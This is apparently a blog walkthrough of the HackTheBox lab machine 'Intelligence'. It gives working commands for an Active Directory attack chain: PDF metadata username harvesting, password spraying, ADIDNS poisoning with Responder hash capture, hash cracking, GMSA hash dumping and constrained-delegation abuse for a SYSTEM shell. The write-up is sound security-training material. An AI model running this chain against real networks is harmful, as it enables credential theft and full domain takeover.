---
title: "Intelligence - HackTheBox Walkthrough"
date: 2026-01-11 10:30:00 +1100
categories: [TryHackMe, HTB]
tags: [active-directory, windows, pentesting, bloodhound, password-spraying, gmsa, constrained-delegation]
image:
  path: /assets/img/intelligence-htb.png
  alt: Intelligence HackTheBox Machine
---

Intelligence is a medium-difficulty Windows machine from HackTheBox that focuses on Active Directory exploitation. This box teaches you about PDF metadata analysis, password spraying, ADIDNS poisoning, GMSA password dumping and constrained delegation abuse.

## Initial Enumeration

I started with a quick port scan to see what services were running on the target.

```bash
nmap -p- --min-rate=1000 -T4 10.129.34.158
```

The scan revealed this was clearly a Windows Domain Controller with services like DNS (53), HTTP (80), Kerberos (88), LDAP (389) and SMB (445) all running. 

Running a more detailed scan on these ports confirmed the domain name: **intelligence.htb**

I added the domain to my hosts file so my system could resolve it properly.

```bash
echo "10.129.34.158 intelligence.htb dc.intelligence.htb" | sudo tee -a /etc/hosts
```

## Web Server Investigation

Browsing to port 80 showed a simple corporate website. Looking at the HTML source, I noticed two PDF files linked in the documents directory following a date-based naming pattern: `YYYY-MM-DD-upload.pdf`

This pattern meant there could be many more PDFs I hadn't found yet. Time to download them all.

## Downloading PDFs

I created a directory for the PDFs and used a loop to download every possible date combination from 2020.

```bash
mkdir pdfs && cd pdfs
for month in {01..12}; do 
  for day in {01..31}; do 
    wget http://10.129.34.158/documents/2020-$month-$day-upload.pdf 2>/dev/null
  done
done
```

After a minute or so, I had dozens of PDF files downloaded.

## Extracting Usernames and Passwords

PDFs often contain useful metadata, especially the Creator field which typically shows who made the document. I extracted all the creator names.

```bash
exiftool -Creator -csv *.pdf | cut -d, -f2 | sort | uniq > ../userlist.txt
```

This gave me a nice list of potential Active Directory usernames like Tiffany.Molina, Ted.Graves, Jose.Williams and many others.

Next, I converted all PDFs to text to read their contents.

```bash
sudo apt install poppler-utils -y
for f in *.pdf; do pdftotext $f; done
```

Searching through the text files, I found something interesting in the June document talking about new employee accounts.

```bash
grep -i "password\|default" *.txt
```

One document mentioned a default password: `NewIntelligenceCorpUser****` (masked for security)

Another document talked about service accounts having security issues. That seemed important for later.

## Password Spraying

With a list of usernames and a default password, I tested which accounts might still be using it.

```bash
crackmapexec smb 10.129.34.158 -u userlist.txt -p 'NewIntelligenceCorpUser****' -d intelligence.htb
```

Success! The account **Tiffany.Molina** was still using the default password.

## Getting User Flag

I connected to the SMB shares with Tiffany's credentials.

```bash
smbclient //10.129.34.158/Users -U "Tiffany.Molina%NewIntelligenceCorpUser****"
```

Navigating to her desktop folder, I grabbed the user flag.

## Finding the PowerShell Script

Tiffany also had access to the IT share, which contained a PowerShell script called `downdetector.ps1`.

```bash
smbclient //10.129.34.158/IT -U "Tiffany.Molina%NewIntelligenceCorpUser****"
get downdetector.ps1
```

Reading the script showed it was scheduled to run every 5 minutes. It checked DNS records for any hostname starting with "web" and sent an authenticated web request to that host using the credentials of **Ted.Graves**.

This was exploitable through DNS poisoning.

## DNS Poisoning Attack

I could add my own DNS record pointing to my machine, wait for the script to run and capture Ted's credentials.

```bash
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser****' -a add -r web1 -d 10.10.15.166 -t A 10.129.34.158
```

The DNS record was added successfully. Now I started Responder to capture the authentication.

```bash
sudo responder -I tun0
```

Within five minutes, the script executed and Ted's NTLMv2 hash appeared in Responder.

## Cracking Ted's Hash

I saved the hash to a file and cracked it with John the Ripper.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ted_hash.txt
```

Ted's password cracked quickly: `Mr.T****` (masked)

## Mapping the Domain with BloodHound

With Ted's credentials, I could enumerate the entire Active Directory structure using BloodHound.

```bash
bloodhound-python -d intelligence.htb -u Ted.Graves -p 'Mr.T****' -ns 10.129.34.158 -c All
```

This created JSON files with all the AD relationships. I started Neo4j and BloodHound to visualize the data.

```bash
sudo neo4j start
bloodhound --no-sandbox
```

After uploading the JSON files and searching for Ted.Graves, the "Shortest Paths to High Value Targets" query revealed an interesting attack path:

1. Ted.Graves is in the **ITSUPPORT** group
2. ITSUPPORT has **ReadGMSAPassword** rights on the service account **SVC_INT**
3. SVC_INT has **constrained delegation** permissions to the Domain Controller

## Reading the GMSA Password

Group Managed Service Accounts (GMSA) store their passwords in Active Directory and certain users can read them. Ted had this permission.

```bash
git clone https://github.com/micahvandeusen/gMSADumper
python3 gMSADumper/gMSADumper.py -u Ted.Graves -p 'Mr.T****' -d intelligence.htb -l 10.129.34.158
```

The tool extracted the NTLM hash for svc_int$: `b8159389d3528c4b1079ae461f28eb69`

## Abusing Constrained Delegation

Constrained delegation allows a service account to impersonate any user to specific services. SVC_INT could impersonate anyone to the WWW service on the DC.

First, I synced my system time with the DC (Kerberos requires accurate time).

```bash
sudo apt install rdate -y
sudo rdate -n 10.129.34.158
```

Then I requested a service ticket for Administrator.

```bash
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator intelligence.htb/svc_int$ -hashes :b8159389d3528c4b1079ae461f28eb69
```

This created an Administrator ticket file.

## Getting Administrator Shell

I exported the ticket and used it to authenticate to the Domain Controller.

```bash
export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
impacket-wmiexec -k -no-pass dc.intelligence.htb
```

A shell appeared with SYSTEM privileges on the Domain Controller.

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

Got the root flag and owned the box!

## Key Takeaways

This machine taught me several important Active Directory attack techniques:

- Always check PDF metadata for usernames
- Default passwords are still commonly used
- DNS records can be manipulated by authenticated users
- GMSA passwords can be read by authorized accounts
- Constrained delegation can be abused for privilege escalation
- BloodHound is essential for visualizing AD attack paths

The attack chain from web enumeration to domain admin shows how multiple small misconfigurations can be chained together for full compromise.
